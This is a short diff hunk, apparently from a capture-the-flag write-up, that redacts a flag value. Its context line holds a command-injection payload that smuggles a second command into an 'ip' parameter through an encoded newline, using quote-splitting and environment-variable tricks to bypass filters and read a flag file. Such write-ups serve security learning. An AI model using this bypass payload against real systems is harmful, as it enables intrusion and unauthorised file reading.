@@ -215,7 +215,7 @@ ip=127.0.0.1%0ac'a't$IFS${PATH:0:1}h'o'me${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
 
 **Expected Flag Content:**
 ```
-HTB{c0mm4nd_1nj3c710n_f1l73r_byp455}
+HTB{...}
 ```
 
 ---
